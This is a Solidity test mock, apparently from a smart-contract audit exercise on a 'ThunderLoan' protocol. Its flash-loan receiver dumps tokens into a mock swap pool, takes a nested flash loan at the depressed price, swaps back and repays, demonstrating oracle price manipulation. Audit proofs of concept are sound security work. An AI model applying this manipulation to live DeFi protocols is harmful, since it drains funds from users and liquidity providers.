// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { BuffMockTSwap } from "./BuffMockTSwap.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";

contract MockFlashLoanReceiver is IFlashLoanReceiver {// we add it to check if the function from
//interface fully implemented, if not the error that this contract is abstract will appear
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;
    address s_MockFlash2;
    address s_SwapPool;
    ERC20Mock tokenA;
    ERC20Mock weth;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan, address SwapPool, ERC20Mock token1, ERC20Mock token2, address MockFlash2) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_SwapPool = SwapPool;
        s_MockFlash2 = MockFlash2;
        tokenA = token1;
        weth = token2;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        // if (initiator != s_owner) {
        //  revert MockFlashLoanReceiver__onlyOwner();
        //}
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        ///////////////////////////////////////////////////////////
        tokenA.approve(address(s_SwapPool), 500e18);
        BuffMockTSwap(s_SwapPool).swapPoolTokenForWethBasedOnInputPoolToken(500e18, 1, uint64(block.timestamp));

        ThunderLoan(s_thunderLoan).flashloan(s_MockFlash2, tokenA, 500e18, "");

        weth.approve(address(s_SwapPool), weth.balanceOf(address(this)));
        BuffMockTSwap(s_SwapPool).swapWethForPoolTokenBasedOnInputWeth(
            weth.balanceOf(address(this)), 1, uint64(block.timestamp)
        );

        // step 1 sell loan at high price for eth
        //step 2 buy at low price back tokens
        // Payback to assetToken contract
        IERC20(token).transfer(address(ThunderLoan(s_thunderLoan).getAssetFromToken(tokenA)), amount + fee);
        //  IThunderLoan(s_thunderLoan).repay(token, amount + fee); //@audit-issue need IERC20(token)
        //error in interface IThunderloan
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getBalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}
